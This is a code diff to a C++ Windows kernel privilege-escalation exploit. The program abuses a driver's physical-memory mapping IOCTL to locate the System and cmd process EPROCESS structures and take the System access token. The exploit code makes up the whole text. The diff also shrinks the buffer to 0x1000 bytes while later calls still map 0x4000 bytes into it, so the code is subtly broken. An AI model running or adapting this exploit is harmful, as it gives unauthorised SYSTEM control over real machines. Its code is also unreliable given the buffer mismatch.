@@ -31,8 +31,7 @@ int main(int argc, char** argv)
 	// measure execution time of program
 	auto start = std::chrono::high_resolution_clock::now();
 	if (GetWindowsOffsets() == -1) {
-		fprintf(stderr, "[!] GetWindowsOffsets() failed\n");
-		//exit(EXIT_FAILURE);
+		fprintf(stderr, "[!] GetWindowsOffsets() failed");
 	}
 
 	HANDLE device = INVALID_HANDLE_VALUE;
@@ -63,13 +62,12 @@ int main(int argc, char** argv)
 	}
 	printf("[+] Called IOCTL_MapPhysicalMemoryToLinearSpace successfully. 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
 	printf("[+] Handle to PhysicalMemory: 0x%p\n", hPhysicalMemory);
-	unsigned int bufSize = 0x4000;
-	PVOID* buf = (PVOID*)malloc(bufSize);
+	PVOID* buf = (PVOID*)malloc(0x1000);
 	if (buf == 0) {
 		exit(EXIT_FAILURE);
 	}
 	
-	std::vector <unsigned __int64> EPROCESS_SYSTEM(0);
+	std::vector <unsigned __int64> EPROCESS_SYSTEM;
 
 	// do some sanity checks with GetEPROCESSPhysicalBase() as there may be some false positives...
 	if (GetEPROCESSPhysicalBase("System", 4, hPhysicalMemory, EPROCESS_SYSTEM) == -1)
@@ -77,17 +75,18 @@ int main(int argc, char** argv)
 		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
 	}
 
+	size_t EPROCESS_SYSTEM_size = EPROCESS_SYSTEM.size();
 	std::vector <unsigned __int64> EPROCESS_SYSTEM_page;
 	std::vector <unsigned __int64> EPROCESS_SYSTEM_page_offset;
-	for (int i = 0; i < EPROCESS_SYSTEM.size(); i++) {
+	for (int i = 0; i < EPROCESS_SYSTEM_size; i++) {
 		EPROCESS_SYSTEM_page.push_back(EPROCESS_SYSTEM[i] & ~((unsigned __int64)-1 & 0xFFF));
 		EPROCESS_SYSTEM_page_offset.push_back(EPROCESS_SYSTEM[i] & (unsigned __int64)-1 & 0xFFF);
 	}
 
 	unsigned __int64 systemToken = 0;
 
-	for (int i = 0; i < EPROCESS_SYSTEM.size(); i++) {
-		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, EPROCESS_SYSTEM_page[i], bufSize, buf) == FALSE) {
+	for (int i = 0; i < EPROCESS_SYSTEM_size; i++) {
+		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, EPROCESS_SYSTEM_page[i], 0x4000, buf) == FALSE) {
 			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
 			return -1;
 		}
@@ -113,15 +112,16 @@ int main(int argc, char** argv)
 		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
 	}
 
+	size_t EPROCESS_cmd_size = EPROCESS_cmd.size();
 	std::vector <unsigned __int64> EPROCESS_cmd_page;
 	std::vector <unsigned __int64> EPROCESS_cmd_page_offset;
-	for (int i = 0; i < EPROCESS_cmd.size(); i++) {
+	for (int i = 0; i < EPROCESS_cmd_size; i++) {
 		EPROCESS_cmd_page.push_back(EPROCESS_cmd[i] & ~((unsigned __int64)-1 & 0xFFF));
 		EPROCESS_cmd_page_offset.push_back(EPROCESS_cmd[i] & (unsigned __int64)-1 & 0xFFF);
 	}
 
 
-	for (int i = 0; i < EPROCESS_cmd.size(); i++) {
+	for (int i = 0; i < EPROCESS_cmd_size; i++) {
 		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, EPROCESS_cmd_page[i], 0x4000, buf) == FALSE) {
 			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
 			return -1;
